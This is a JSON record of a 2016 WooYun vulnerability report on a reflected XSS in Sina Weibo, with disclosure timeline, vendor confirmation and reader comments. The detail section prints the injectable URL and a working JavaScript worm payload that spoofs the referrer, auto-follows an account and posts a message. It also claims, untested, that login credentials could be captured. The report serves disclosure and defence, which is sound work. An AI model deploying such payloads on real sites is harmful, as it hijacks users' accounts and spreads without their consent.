{"id": 85733, "wybug_id": "wooyun-2016-0174297", "wybug_title": "新浪微博一处反射型XSS（可截获用户登录名及明文密码、可蠕虫、可刷关注）", "wybug_corp": "新浪微博", "wybug_author": "Neeke", "wybug_date": "2016-02-01 23:16", "wybug_open_date": "2016-03-17 18:12", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "类型应用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-03-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-17：\t细节向公众公开  简要描述： 本来想找个CSRF的，结果找到个XSS，接着又找到一处refer验证不严，结合起来可以刷关注了。 详细说明：  首先，反射XSS在这里：http://service.weibo.com/widget/public/login.php?source=share&backurl=http://service.weibo.com/share/mobile.php?url=aaaaaaaa',a:(alert(1))//加关注：POST：http://widget.weibo.com/relationship/aj_attention.phpwsrc=app_follow_button&uid=XXX发微博：POST：http://service.weibo.com/share/aj_share.phpcontent=新年快了！恭喜发财！然后我写了段代码测试了一下效果。\n(function(){//set referrervar meta = document.createElement('meta');meta.name = 'referrer';meta.content = 'origin';document.head.appendChild(meta);//document.head.appendChild(style);var iframe = document.createElement('iframe');iframe.name = 'myframe'document.head.appendChild(iframe);//fowllo mevar form = document.createElement('form'),    input1 = document.createElement('input'),    input2 = document.createElement('input');input1.name = 'wsrc';input1.value = 'app_follow_button';input2.name = 'uid';input2.value = '1719751704';form.appendChild(input1);form.appendChild(input2);form.action = 'http://widget.weibo.com/relationship/aj_attention.php';form.method = 'post';form.target = 'myframe';document.head.appendChild(form);form.submit();//create xhrvar xhr = false;try {        xhr = new XMLHttpRequest()} catch (d) {        try {                xhr = new ActiveXObject(\"Msxml2.XMLHTTP\")        } catch (c) {                try {                        xhr = new ActiveXObject(\"Microsoft.XMLHTTP\")                } catch (b) {                        xhr = false                }        }}//send messagevar data = 'content=新年快了！恭喜发财！';xhr.open('POST', 'http://service.weibo.com/share/aj_share.php?t=' + new Date().getTime(), false);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send(data);})();\n用户以登录状态访问上面那个XSS就中招了，本来想全部走AJAX的，但是加关注那里跨域了，行不通，就改成form了，再就是分享这里验证了refer，所以用JS控制当前页面的referrer为origin，然后把上面这一大段JS通过反射XSS远程加载进来就行了，content中再加上链接就可以蠕动起来了。劫持用户名和密码我没试，但是理论上应该是可以的，因为本来就是微博正常的登录页面，插点JS截获表单数据很容易了。   漏洞证明：  \n\n\n\n\n\n\n\n   修复方案：  过滤，转义，验证。   版权声明：转载请注明来源 Neeke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-02-02 10:05 厂商回复： 感谢支持，漏洞修复中 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-01 23:27 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:17        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  沙发    \n     2016-02-02 00:56 |    \t\t动感超人 \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:11        | 小心动感光波)\t\t \n  学习    \n     2016-02-02 03:08 |    \t\t孤梦° \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:23        | 不懂网络安全的人是幸福的人,我们的责任就...)\t\t \n  沙发    \n     2016-02-02 11:26 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1561 漏洞数:234        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @啊l川，@浩天，下次这标题党的“可截获用户登录名及明文密码”能不能证明额以后再说啊    \n     2016-02-02 12:23 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:17        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  川神怒了    \n     2016-02-02 13:40 |    \t\ttSt \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:30        | 在开发里运维最强，运维里网络最强，网络里...)\t\t \n  给我来二斤粉丝    \n     2016-02-22 10:21 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1081 漏洞数:182        | px1624)\t\t \n  @小川 哈哈，估计洞主的意思是可以钓鱼用户名和明文密码。    \n     2016-02-23 10:24 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:26        | 额滴歌神呀！)\t\t \n  @px1624 是    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}